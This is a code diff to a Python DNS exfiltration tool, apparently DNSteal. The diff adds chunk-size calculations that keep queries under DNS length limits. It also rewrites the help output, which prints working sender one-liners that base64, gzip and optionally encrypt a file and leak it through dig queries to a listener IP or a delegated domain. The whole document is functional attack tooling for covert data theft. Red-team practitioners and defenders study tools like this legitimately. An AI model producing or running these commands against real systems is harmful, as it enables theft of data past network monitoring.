@@ -48,6 +48,68 @@ from typing import Dict, List, Optional, Tuple
 VERSION = "3.0-final-py3"
 
 
+def calculate_safe_chunks(domain: str, filename_estimate: int = 15, safety_margin: int = 10) -> Tuple[int, int]:
+    """
+    Calculate safe chunk parameters to stay under 253 byte DNS limit.
+    Also ensures each individual label stays under 63 bytes.
+    
+    DNS query structure: data1-.data2-.data3-.filename.random.domain
+    Total must be ≤ 253 bytes, each label ≤ 63 bytes
+    """
+    domain = domain.strip('.')
+    domain_len = len(domain)
+    random_len = 5  # $RANDOM typically produces ~5 digits
+    
+    # Fixed overhead: domain + random + dots + safety margin
+    fixed_overhead = domain_len + random_len + filename_estimate + safety_margin
+    available_bytes = 253 - fixed_overhead
+    
+    if available_bytes <= 30:  # Need minimum space for meaningful data
+        raise ValueError(f"Domain '{domain}' ({domain_len} chars) too long for DNS exfiltration. Try shorter domain.")
+    
+    # Try different subdomain configurations, preferring more subdomains for efficiency
+    configs = [
+        (4, None),  # 4 subdomains, calculate bytes per chunk
+        (3, None),  # 3 subdomains, calculate bytes per chunk  
+        (2, None),  # 2 subdomains, calculate bytes per chunk
+        (1, None),  # 1 subdomain (last resort)
+    ]
+    
+    for subdomains, _ in configs:
+        # Account for dots between data chunks and after last chunk
+        dots_overhead = subdomains + 1  # dots between chunks + dot before filename
+        data_space = available_bytes - dots_overhead
+        
+        if data_space > 0:
+            # DNS label max is 63 bytes, but we need to account for the trailing "-"
+            max_chunk_size = min(62, data_space // subdomains)  # 62 to leave room for "-"
+            
+            # Need reasonable chunk size to be efficient
+            if max_chunk_size >= 20:
+                total_estimated = (subdomains * max_chunk_size) + dots_overhead + fixed_overhead
+                return subdomains, max_chunk_size
+    
+    raise ValueError(f"Cannot create efficient chunks for domain '{domain}'. Domain too long or filename too long.")
+
+
+def validate_query_length(domain: str, s: int, b: int, filename_len: int = 15) -> Tuple[bool, int]:
+    """
+    Validate that DNS queries will fit in 253 bytes.
+    Returns (is_valid, estimated_length)
+    """
+    domain = domain.strip('.')
+    
+    # Estimate query components
+    data_bytes = s * b                    # data chunks
+    dots = s + 1                         # dots between chunks + before filename  
+    domain_bytes = len(domain)           # domain length
+    random_bytes = 5                     # $RANDOM digits
+    filename_bytes = filename_len        # estimated filename
+    
+    estimated_length = data_bytes + dots + domain_bytes + random_bytes + filename_bytes
+    return estimated_length <= 253, estimated_length
+
+
 class C:
     N = "\033[0m"
     R = "\033[1;31m"
@@ -276,85 +338,104 @@ def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompr
         print(f"{C.G}[sha256]{sha256}{C.N}\n")
 
 
-def help_text(listen_ip: str, s: int, b: int, domain: str, password: Optional[str]) -> str:
+def help_text(listen_ip: str, s: int, b: int, domain: str, password: Optional[str], use_gzip: bool) -> str:
+    """Generate contextual help based on the command arguments provided."""
     encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"
     domain = domain.strip(".") or "zz"
-
+    
+    # Determine if we're in delegated domain mode or direct mode
+    is_delegated_mode = domain != "zz"
+    
+    # Build appropriate source command based on encryption and compression
     if password:
         password_prefix = f"export DNSTEAL_PASS={shlex.quote(password)}; "
-        plain_source = "openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS -in \"$f\" | base64 -w0"
-        zipped_source = "gzip -c \"$f\" | openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS | base64 -w0"
-        password_note = (
-            f"{C.Y}Password encryption enabled with AES-256-CBC/PBKDF2. "
-            f"Sender commands export DNSTEAL_PASS first.{C.N}"
-        )
+        if use_gzip:
+            source_cmd = "gzip -c \"$f\" | openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS | base64 -w0"
+            mode_desc = "encrypted + gzipped"
+            listener_flags = "-z -p"
+        else:
+            source_cmd = "openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS -in \"$f\" | base64 -w0"
+            mode_desc = "encrypted"
+            listener_flags = "-p"
     else:
         password_prefix = ""
-        plain_source = "base64 -w0 \"$f\""
-        zipped_source = "gzip -c \"$f\" | base64 -w0"
-        password_note = ""
+        if use_gzip:
+            source_cmd = "gzip -c \"$f\" | base64 -w0"
+            mode_desc = "gzipped"
+            listener_flags = "-z"
+        else:
+            source_cmd = "base64 -w0 \"$f\""
+            mode_desc = "plain"
+            listener_flags = ""
 
-    plain = (
+    # Build the appropriate dig command
+    if is_delegated_mode:
+        dig_cmd = "dig +noidnin +short +retries=0 +tries=1"
+        mode_title = f"{C.W}Sender examples for delegated domain mode{C.N}"
+        mode_note = f"{C.Cy}Domain: {domain} (uses normal DNS resolution){C.N}"
+    else:
+        dig_cmd = f"dig +noidnin @{listen_ip} +short +retries=0 +tries=1"
+        mode_title = f"{C.W}Direct-to-listener examples{C.N}"
+        mode_note = f"{C.Cy}Target: {listen_ip} (direct queries){C.N}"
+
+    # Build the complete command
+    # Build the complete command with proper bash escaping
+    command = (
         f"{password_prefix}f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $({plain_source} | sed \"s/.\{{$b\}}/&\\n/g\"); "
-        f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
+        f"for r in $(for i in $({source_cmd} | fold -w{b}); "
+        f"do if [[ \"$c\" -lt \"{s}\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
         f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig +noidnin +short +retries=0 +tries=1 "
-        f"\"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
+        f"do {dig_cmd} \"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
     )
 
-    zipped = (
-        f"{password_prefix}f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $({zipped_source} | sed \"s/.\{{$b\}}/&\\n/g\"); "
-        f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
-        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig +noidnin +short +retries=0 +tries=1 "
-        f"\"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
-    )
+    # Calculate and show query length validation
+    is_valid, estimated_length = validate_query_length(domain, s, b)
+    length_status = f"✅ ~{estimated_length} bytes" if is_valid else f"⚠️  ~{estimated_length} bytes (>253 limit!)"
 
-    direct_plain = plain.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
-    direct_zipped = zipped.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
-
-    sections = [
-        "",
-        f"{C.W}Sender examples through normal DNS resolution{C.N}",
-    ]
-
-    if password_note:
-        sections.extend(["", password_note])
-
+    sections = ["", mode_title, "", mode_note, ""]
+    
+    # Add password note if encryption is enabled
+    if password:
+        sections.extend([
+            f"{C.Y}🔐 Password encryption enabled with AES-256-CBC/PBKDF2{C.N}",
+            f"{C.Y}   Sender must export DNSTEAL_PASS environment variable first{C.N}",
+            ""
+        ])
+    
+    # Add listener command for reference
+    listener_cmd = f"sudo python3 {sys.argv[0]} {listen_ip}"
+    if listener_flags:
+        listener_cmd += f" {listener_flags}"
+    if is_delegated_mode:
+        listener_cmd += f" -d {domain}"
+        
     sections.extend([
+        f"{C.G}# {mode_desc.title()} file transfer{C.N}",
+        f"{C.B}# Listener command: {listener_cmd}{C.N}",
+        command,
         "",
-        f"{C.G}# Plain file transfer. Listener: no -z{C.N}",
-        plain,
+        f"{C.W}Current configuration{C.N}",
+        f"  Mode: {'🌐 Delegated domain' if is_delegated_mode else '🎯 Direct to listener'}",
+        f"  Domain: {domain}",
+        f"  Compression: {'✅ Enabled (-z)' if use_gzip else '❌ Disabled'}",
+        f"  Encryption: {'🔐 Enabled (-p)' if password else '❌ Disabled'}",
+        f"  Chunks per query: {s} subdomains",
+        f"  Bytes per chunk: {b} bytes",
         "",
-        f"{C.G}# Gzipped file transfer. Listener: use -z{C.N}",
-        zipped,
-        "",
-        f"{C.W}Direct-to-listener lab examples{C.N}",
-        "",
-        f"{C.G}# Plain direct query to listener IP{C.N}",
-        direct_plain,
-        "",
-        f"{C.G}# Gzipped direct query to listener IP{C.N}",
-        direct_zipped,
-        "",
-        f"{C.W}Options{C.N}",
+        f"{C.W}Available options{C.N}",
         "  -z        gunzip received data before writing",
         "  -p PASS   decrypt received data using OpenSSL AES-256-CBC/PBKDF2 before gunzip",
-        "  -v        verbose: print received labels/chunks",
+        "  -v        verbose: print received labels/chunks", 
         f"  -s N      data subdomains per DNS query, default {s}",
         f"  -b N      bytes per data label, default {b}",
-        "  -f N      accepted for compatibility, default 17",
+        "  -f N      filename label length, compatibility option, default 17",
         "  -o DIR    output directory, default current directory",
         "  -d DOMAIN domain suffix for delegated-domain mode, default zz",
         "",
         f"{C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}",
     ])
 
-    return "
-".join(sections) + "
-"
+    return "\n".join(sections) + "\n"
 
 
 def main() -> None:
@@ -369,12 +450,45 @@ def main() -> None:
     parser.add_argument("-b", type=int, default=57, help="bytes per data label")
     parser.add_argument("-f", type=int, default=17, help="filename label length, compatibility option")
     parser.add_argument("-o", "--output-dir", default=".", help="directory to write recovered files")
-    parser.add_argument("-d", "--domain", default="zz", help="domain suffix for normal DNS mode, for example tunnel.example.com")
+    parser.add_argument("-d", "--domain", default="zz", help="domain suffix for delegated-domain mode, for example tunnel.example.com")
     parser.add_argument("-p", "--password", help="decrypt received data using OpenSSL AES-256-CBC/PBKDF2")
     args = parser.parse_args()
+    
+    # Auto-calculate safe chunks if using delegated domain with defaults
+    original_s, original_b = args.s, args.b
+    using_defaults = (args.s == 4 and args.b == 57)
+    
+    if args.domain != "zz":  # Delegated domain mode
+        try:
+            # Check if current parameters are safe
+            is_valid, estimated_length = validate_query_length(args.domain, args.s, args.b)
+            
+            if not is_valid:
+                if using_defaults:
+                    # Auto-adjust since user didn't specify custom values
+                    safe_s, safe_b = calculate_safe_chunks(args.domain)
+                    print(f"{C.Y}[!] Auto-adjusted chunks for domain '{args.domain}': -s {safe_s} -b {safe_b}{C.N}")
+                    print(f"{C.Y}    Previous: {args.s}×{args.b} = ~{estimated_length} bytes (too long){C.N}")
+                    args.s, args.b = safe_s, safe_b
+                    is_valid, new_length = validate_query_length(args.domain, args.s, args.b)
+                    print(f"{C.Y}    New: {args.s}×{args.b} = ~{new_length} bytes (safe){C.N}")
+                else:
+                    # User specified custom values, just warn
+                    print(f"{C.R}[!] Warning: DNS queries may be too long (~{estimated_length} bytes > 253){C.N}")
+                    print(f"{C.R}    Consider using: -s {calculate_safe_chunks(args.domain)[0]} -b {calculate_safe_chunks(args.domain)[1]}{C.N}")
+                    
+        except ValueError as e:
+            print(f"{C.R}[!] {e}{C.N}")
+            print(f"{C.R}    Try a shorter domain or use direct mode (remove -d flag){C.N}")
+            sys.exit(1)
+    else:
+        # Direct mode - validate but don't auto-adjust (direct mode is more forgiving)
+        is_valid, estimated_length = validate_query_length(args.domain, args.s, args.b)
+        if not is_valid and estimated_length > 300:  # Only warn for very long queries in direct mode
+            print(f"{C.Y}[!] Warning: Large queries (~{estimated_length} bytes) may cause issues{C.N}")
 
     print(BANNER)
-    print(help_text(args.ip, args.s, args.b, args.domain, args.password))
+    print(help_text(args.ip, args.s, args.b, args.domain, args.password, args.z))
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
